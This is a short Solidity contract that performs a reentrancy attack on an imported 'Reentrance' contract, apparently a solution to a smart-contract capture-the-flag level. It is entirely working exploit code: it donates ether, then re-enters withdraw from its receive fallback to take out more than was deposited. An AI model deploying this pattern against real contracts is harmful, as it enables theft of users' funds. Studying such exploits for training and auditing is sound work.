// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract Reentrancy {
    Reentrance public reentrance;
    bool public entered;

    constructor(Reentrance _reentrance) public {
        reentrance = _reentrance;
    }

    function exploit() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            reentrance.withdraw(msg.value);
        }
    }
}
